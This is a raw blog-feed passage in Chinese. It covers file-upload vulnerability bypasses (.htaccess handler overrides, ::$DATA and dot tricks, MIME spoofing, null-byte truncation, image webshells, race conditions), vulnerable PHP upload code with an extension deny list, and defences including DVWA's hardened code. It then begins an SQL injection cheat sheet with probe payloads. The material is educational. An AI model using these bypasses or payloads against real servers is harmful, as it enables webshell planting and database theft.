<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.ini&quot;</span><br></pre></td></tr></table></figure>



<h5 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a><code>.htaccess</code></h5><blockquote>
<p>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置.通过htaccess文件，可以实现:网页301重定向、自定义404页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
<p>在apache中，如果需要启动.htaccess，必须在http.conf中设置AllowOverride为All。</p>
</blockquote>
<p>如果我们上传一个<code>.htaccess</code>，其内容为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php</span><br></pre></td></tr></table></figure>

<p>这样的话所有文件都会被解析为php。</p>
<p>注意由于直接创建txt文档会显示必须键入文件名，所以可以采用cmd命令方式来生成<code>.htaccess</code>。</p>
<h5 id="利用各类符号绕过后缀名"><a href="#利用各类符号绕过后缀名" class="headerlink" title="利用各类符号绕过后缀名"></a>利用各类符号绕过后缀名</h5><p>当这些后缀都被拉入黑名单时，我们可以考虑用大小写、双写、点号等方式来绕过。大小写、双写、结尾加空格等常规方式就不再赘述，主要说一下点绕过、<code>::$DATA</code>绕过、路径拼接绕过这些绕过方法。</p>
<h6 id="点绕过"><a href="#点绕过" class="headerlink" title="点绕过"></a>点绕过</h6><p>windows系统下，后缀名的最后一个点会被自动删除掉，所以可以通过在结尾加一个点的方式绕过黑名单。</p>
<h6 id="DATA绕过"><a href="#DATA绕过" class="headerlink" title="::$DATA绕过"></a><code>::$DATA</code>绕过</h6><blockquote>
<p>是Windows下NTFS文件系统的一个特性，即NTFS文件系统的存储数据流的一个属性 DATA 时，就是请求 <code>a.asp</code> 本身的数据，如果a.asp 还包含了其他的数据流，比如 <code>a.asp:lake2.asp</code>，请求 <code>a.asp:lake2.asp::$DATA</code>，则是请求<code>a.asp</code>中的流数据<code>lake2.asp</code>的流数据内容。</p>
</blockquote>
<p>因此我们在后缀名中添加<code>::$DATA</code>即可绕过。</p>
<p>注意要在Linux下修改文件名，因为在Windows下创建不了。</p>
<h6 id="路径拼接绕过"><a href="#路径拼接绕过" class="headerlink" title="路径拼接绕过"></a>路径拼接绕过</h6><p>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里对文件名进行了处理，删除了文件名末尾的点，并且把处理过的文件名拼接到路径中。</p>
<p>这里我们就可以将文件名构造为  <code>1.php. .</code>  （点+空格+点），这样在路径拼接之后，文件名就会变成<code>1.php</code>，从而成功绕过。</p>
<h4 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h4><h5 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h5><blockquote>
<p>MIME（Multipurpose Internet Mail Extensions）多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当改扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开，多用于指定一些客户端自定义的文件夹，以及一些媒体文件打开方式。</p>
</blockquote>
<p>我们来看一个示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || ($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || ($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];          </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在这里我们检查<code>Content-type</code>，burp抓包修改其类型即可绕过。</p>
<p>  <code>Content-type</code>常见类型见下：</p>
<table>
<thead>
<tr>
<th>文件类型</th>
<th>Content-type</th>
</tr>
</thead>
<tbody><tr>
<td>超文本标记语言文本</td>
<td>.html,.html text/html</td>
</tr>
<tr>
<td>普通文本</td>
<td>.txt text/plain</td>
</tr>
<tr>
<td>RTF文本</td>
<td>.txt text/plain</td>
</tr>
<tr>
<td>GIF图形</td>
<td>.gif image/gif</td>
</tr>
<tr>
<td>JPEG图形</td>
<td>.jpeg,.jpg image/jpeg</td>
</tr>
<tr>
<td>au声音文件</td>
<td>.au audio/basic</td>
</tr>
<tr>
<td>MIDI音乐文件</td>
<td>.mid,.midi audio/midi,audio/x-midi</td>
</tr>
<tr>
<td>RealAudio音乐文件</td>
<td>.ra, .ram audio/x-pn-realaudio</td>
</tr>
<tr>
<td>MPEG文件</td>
<td>.mpg,.mpeg video/mpeg</td>
</tr>
<tr>
<td>AVI文件</td>
<td>.avi video/x-msvideo</td>
</tr>
<tr>
<td>GZIP文件</td>
<td>.gz application/x-gzip</td>
</tr>
<tr>
<td>TAR文件</td>
<td>.tar application/x-tar</td>
</tr>
</tbody></table>
<h5 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h5><p>00截断是很常见的截断方法，原理是有些函数处理时，会把这个字符当作结束符。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">截断条件：php版本小于5.3.4，php的magic_quotes_gpc为OFF状态</span><br></pre></td></tr></table></figure>

<p>如：1.php0x00.jpg</p>
<p>值得注意的是，在GET型00截断中，我们要使用<code>%00</code>来截断，因为GET型提交的内容会被自动进行URL解码；而在POST型00截断中，<code>%00</code>是不会被自动解码的，我们需要在16进制中对其进行修改，将其改为00即可截断。</p>
<h3 id="检查内容"><a href="#检查内容" class="headerlink" title="检查内容"></a>检查内容</h3><h4 id="文件幻数-文件头检测"><a href="#文件幻数-文件头检测" class="headerlink" title="文件幻数/文件头检测"></a>文件幻数/文件头检测</h4><p>文件幻数是用来唯一标识文件类型的一系列数字（十六进制），也就是我们常说的文件头，当白名单限制了文件幻数时，我们就要给我们的文件制造可以过关的文件头：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.jpg	Value &#x3D; FF D8 FF E0 </span><br><span class="line">.gif	Value &#x3D; 47 49 46 38</span><br><span class="line">.png	Value &#x3D; 89 50 4E 47</span><br><span class="line">.html	Value &#x3D; 68 74 6D 6C 3E 10</span><br><span class="line">.xml	Value &#x3D; 3C 3F 78 6D 6C</span><br></pre></td></tr></table></figure>

<p>然后在文件幻数之后加上我们要的木马就好了。</p>
<h4 id="制作图片马"><a href="#制作图片马" class="headerlink" title="制作图片马"></a>制作图片马</h4><p>当服务端会对文件进行加载测试、渲染测试时，我们就可以将我们的代码注入到图片中，这样就不会破坏文件的格式，从而在白名单允许的图片格式范围内成功插入php代码，然后再利用文件包含来执行该代码。</p>
<p>一句话木马（webshell）中常用的危险函数有<code>eval()</code> 、 <code>assert()</code> 、 <code>preg_replace()</code> ：</p>
<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.3/php/phpupdate/1.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.3/php/phpupdate/2.png"></p>
<p>制作方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.3/php/phpupdate/3.png"></p>
<blockquote>
<p>​    文件包含漏洞请见：<a href="https://jiulin.space/2021/01/02/php3/#more">https://jiulin.space/2021/01/02/php3/#more</a></p>
</blockquote>
<h4 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h4><blockquote>
<p>二次渲染，相当于把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染。在该过程中，非图像数据的部分与图像数据会被隔离开。</p>
</blockquote>
<p>方法也很简单，我们在十六进制中寻找二次渲染并未改变的部分，在其中插入php代码就好了。</p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h4 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h4><p>当网站的文件上传的过程是：<code>服务器获取文件–&gt;保存上传临时文件–&gt;重命名移动临时文件</code> 这样的步骤时，</p>
<p>我们就可以使用条件竞争来进行绕过，通过不断地对文件进行上传和打开，从而使服务器还未重命名移动临时文件时，我们就利用时间差打开了文件，成功执行其中的php代码。</p>
<p>具体方法：我们可以利用burp不断发包来进行条件竞争，也可以通过python脚本来反复发送请求得到结果。 </p>
<hr>
<h1 id="文件上传漏洞防御思路"><a href="#文件上传漏洞防御思路" class="headerlink" title="文件上传漏洞防御思路"></a>文件上传漏洞防御思路</h1><blockquote>
<p>引自：<a href="http://smallwolf.top/2020/11/27/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/[%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E8%8C%83%E6%96%B9%E6%B3%95_m0_38103658%E7%9A%84%E5%8D%9A%E5%AE%A2-CSDN%E5%8D%9A%E5%AE%A2_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E](https://blog.csdn.net/m0_38103658/article/details/100162185?ops_request_misc=%7B%22request_id%22:%22160630266919725271621661%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=160630266919725271621661&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-5-100162185.pc_first_rank_v2_rank_v28&utm_term=%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E&spm=1018.2118.3001.4449)">美创安全实验室</a></p>
</blockquote>
<h2 id="系统运行时的防御"><a href="#系统运行时的防御" class="headerlink" title="系统运行时的防御"></a>系统运行时的防御</h2><ol>
<li>文件上传的目录设置为不可执行。只要web容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响，因此这一点至关重要。</li>
<li>判断文件类型。在判断文件类型时，可以结合使用MIME Type、后缀检查等方式。在文<br>件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的。此外，对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码。</li>
<li>使用随机数改写文件名和文件路径。文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像shell.php.rar.rar和crossdomain.xml这种文件，都将因为重命名而无法攻击。</li>
<li>单独设置文件服务器的域名。由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript的XSS利用等问题将得到解决。</li>
<li>使用安全设备防御。文件上传攻击的本质就是将恶意文件或者脚本上传到服务器，专业的安全设备防御此类漏洞主要是通过对漏洞的上传利用行为和恶意文件的上传过程进行检测。恶意文件千变万化，隐藏手法也不断推陈出新，对普通的系统管理员来说可以通过部署安全设备来帮助防御。</li>
</ol>
<h2 id="系统开发阶段的防御"><a href="#系统开发阶段的防御" class="headerlink" title="系统开发阶段的防御"></a>系统开发阶段的防御</h2><ol>
<li>系统开发人员应有较强的安全意识，尤其是采用PHP语言开发系统。在系统开发阶段应充分考虑系统的安全性。</li>
<li>对文件上传漏洞来说，最好能在客户端和服务器端对用户上传的文件名和文件路径等项目分别进行严格的检查。客户端的检查虽然对技术较好的攻击者来说可以借助工具绕过，但是这也可以阻挡一些基本的试探。服务器端的检查最好使用白名单过滤的方法，这样能防止大小写等方式的绕过，同时还需对%00截断符进行检测，对HTTP包头的content-type也和上传文件的大小也需要进行检查。</li>
</ol>
<h2 id="系统维护阶段的防御"><a href="#系统维护阶段的防御" class="headerlink" title="系统维护阶段的防御"></a>系统维护阶段的防御</h2><ol>
<li>系统上线后运维人员应有较强的安全意思，积极使用多个安全检测工具对系统进行安全扫描，及时发现潜在漏洞并修复。</li>
<li>定时查看系统日志，web服务器日志以发现入侵痕迹。定时关注系统所使用到的第三方插件的更新情况，如有新版本发布建议及时更新，如果第三方插件被爆有安全漏洞更应立即进行修补。</li>
<li>对于整个网站都是使用的开源代码或者使用网上的框架搭建的网站来说，尤其要注意漏洞的自查和软件版本及补丁的更新，上传功能非必选可以直接删除。除对系统自生的维护外，服务器应进行合理配置，非必选一般的目录都应去掉执行权限，上传目录可配置为只读。</li>
</ol>
<h2 id="防护代码参考"><a href="#防护代码参考" class="headerlink" title="防护代码参考"></a>防护代码参考</h2><blockquote>
<p>引自DVWA中impossible源码</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>);</span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line">    $uploaded_type = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ];</span><br><span class="line">    $uploaded_tmp  = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    $target_path   = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&#x27;hackable/uploads/&#x27;</span>;</span><br><span class="line">    <span class="comment">//$target_file   = basename( $uploaded_name, &#x27;.&#x27; . $uploaded_ext ) . &#x27;-&#x27;;</span></span><br><span class="line">    $target_file   =  md5( uniqid() . $uploaded_name ) . <span class="string">&#x27;.&#x27;</span> . $uploaded_ext;</span><br><span class="line">    $temp_file     = ( ( ini_get( <span class="string">&#x27;upload_tmp_dir&#x27;</span> ) == <span class="string">&#x27;&#x27;</span> ) ? ( sys_get_temp_dir() ) : ( ini_get( <span class="string">&#x27;upload_tmp_dir&#x27;</span> ) ) );</span><br><span class="line">    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . <span class="string">&#x27;.&#x27;</span> . $uploaded_ext;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( $uploaded_ext ) == <span class="string">&#x27;jpg&#x27;</span> || strtolower( $uploaded_ext ) == <span class="string">&#x27;jpeg&#x27;</span> || strtolower( $uploaded_ext ) == <span class="string">&#x27;png&#x27;</span> ) &amp;&amp;</span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">        ( $uploaded_type == <span class="string">&#x27;image/jpeg&#x27;</span> || $uploaded_type == <span class="string">&#x27;image/png&#x27;</span> ) &amp;&amp;</span><br><span class="line">        getimagesize( $uploaded_tmp ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)</span></span><br><span class="line">        <span class="keyword">if</span>( $uploaded_type == <span class="string">&#x27;image/jpeg&#x27;</span> ) &#123;</span><br><span class="line">            $img = imagecreatefromjpeg( $uploaded_tmp );</span><br><span class="line">            imagejpeg( $img, $temp_file, <span class="number">100</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            $img = imagecreatefrompng( $uploaded_tmp );</span><br><span class="line">            imagepng( $img, $temp_file, <span class="number">9</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        imagedestroy( $img );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the web root from the temp folder?</span></span><br><span class="line">        <span class="keyword">if</span>( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;a href=&#x27;$&#123;target_path&#125;$&#123;target_file&#125;&#x27;&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Delete any temp files</span></span><br><span class="line">        <span class="keyword">if</span>( file_exists( $temp_file ) )</span><br><span class="line">            unlink( $temp_file );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1. strtolower()函数，对字符串进行小写操作，防止了用大小写绕过</span></span><br><span class="line"><span class="comment">//2. uniqid()函数，基于以微秒计的当前时间，生成一个唯一的ID</span></span><br><span class="line"><span class="comment">//3. $target_file = md5( uniqid() . $uploaded_name ) . ‘.’ . $uploaded_ext;：对上传的文件进行了重命名，为md5值，导致00截断无法绕过过滤规则</span></span><br><span class="line"><span class="comment">//4. 通过imagecreatefromjpeg()和imagecreatefrompng()函数将上传的图片文件重新写入到一个新的图片文件中，这两个函数会自动将图片中的有害元数据抹除，因此即使黑客上传了一张图片马也会被这个函数过滤成一个纯正的图片。</span></span><br><span class="line"><span class="comment">//5. imagedestroy( $img )将用户上传的源文件删除</span></span><br><span class="line"><span class="comment">//6. unlink( $temp_file )删除过滤过程中产生的任何临时文件</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>php</category>
      </categories>
  </entry>
  <entry>
    <title>SQL注入总结</title>
    <url>/2020/11/29/sqli/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文主要总结sql注入相关的知识点。很多地方都写得比较基础，一来便于自己复习，二来需要查阅相关资料的人看到这篇文章理解也会比较方便。为了总结全面一点，文中部分内容直接或间接引用于其他大牛的文章中，我都会标明出处，如有侵权，请发email联系我删除。多有不合理之处，望大佬指点。</p>
<p>随时更新</p>
<hr>
<h2 id="MySQL注入原理"><a href="#MySQL注入原理" class="headerlink" title="MySQL注入原理"></a>MySQL注入原理</h2><p>造成原因即，由于一些程序或网站没能全面地过滤、拦截我们输入的数据，我们就可以利用在输入的数据中插入恶意语句，从而欺骗服务器来执行我们插入的sql语句，来获得数据库中的数据或者修改数据库。</p>
<p>注入的步骤一般是，先通过用一些常见的尝试语句，如<code>&#39;or 1=1--+</code>来寻找注入点或者适合的注入方法，然后再去构造语句对数据库进行增、删、改，读写文件，或者是一步一步从数据库查询到我们想得到的字段数据来达成目的。<a id="more"></a></p>
<hr>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><blockquote>
<p><strong>以下内容整理自</strong><a href="http://blog.zeddyu.info/2019/03/06/Sqli%E5%A4%87%E5%BF%98%E5%BD%95/#Basic"><strong>《sql注入备忘录》</strong></a> <strong><a href="https://xz.aliyun.com/t/1298">《sql注入天书》</a></strong></p>
</blockquote>
<h3 id="information-schema数据库"><a href="#information-schema数据库" class="headerlink" title="information_schema数据库"></a>information_schema数据库</h3><p>在Mysql5.0以上的版本中加入了一个information_schema这个系统表，这个系统表中包含了该数据库的所有数据库名、表名、列表，我们可以通过SQL注入来拿到用户的账号和口令。</p>
<blockquote>
<p>reference：<a href="https://blog.csdn.net/wwl012345/article/details/97046751">《Mysql中的information_schema数据库》</a></p>
</blockquote>
<h3 id="注释方法"><a href="#注释方法" class="headerlink" title="注释方法"></a>注释方法</h3><ul>
<li><pre><code class="sql">select * from message ;--where id =1;
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  - —+</span><br><span class="line"></span><br><span class="line">- &#96;&#96;&#96;sql</span><br><span class="line">  select * from message ;—+where id &#x3D;1;</span><br></pre></td></tr></table></figure>

- \#</code></pre>
</li>
<li><pre><code class="sql">select * from message ;#where id =1;
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  - %00</span><br><span class="line"></span><br><span class="line">- &#96;&#96;&#96;sql</span><br><span class="line">  select * from message ;%00where id &#x3D;1;</span><br></pre></td></tr></table></figure>

- /**/</code></pre>
</li>
<li><pre><code class="sql">select * from message ;/*where id =1;*/
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">### 一般用于尝试的语句 </span><br><span class="line"></span><br><span class="line">or 1&#x3D;1--+ </span><br><span class="line"></span><br><span class="line">&#39;or 1&#x3D;1--+ </span><br><span class="line"></span><br><span class="line">&quot;or 1&#x3D;1--+ </span><br><span class="line"></span><br><span class="line">)or 1&#x3D;1--+ </span><br><span class="line"></span><br><span class="line">&#39;)or 1&#x3D;1--+ </span><br><span class="line"></span><br><span class="line">&quot;) or 1&#x3D;1--+ </span><br><span class="line"></span><br><span class="line">&quot;))or 1&#x3D;1--+</span><br><span class="line"></span><br><span class="line">### 字符串截取</span><br><span class="line"></span><br><span class="line">- MID(column_name,start[,length]) start起始为1</span><br><span class="line">- LEFT(str,length) length为从左边开始要返回的字符数</span><br><span class="line">- RIGHT(str,length). length为从右边开始要返回的字符数</span><br><span class="line">- SUBSTR(str,pos,len) 从pos开始截取len个,pos起始为1,pos 可以是负值</span><br><span class="line">- SUBSTRING(str,pos,len). 与subsets()相同</span><br><span class="line"></span><br><span class="line">### 字符串连接函数</span><br><span class="line"></span><br><span class="line">- concat(str1,str2,...)——没有分隔符地连接字符串 </span><br><span class="line"></span><br><span class="line">- concat_ws(separator,str1,str2,...)——含有分隔符地连接字符串 </span><br><span class="line"></span><br><span class="line">- 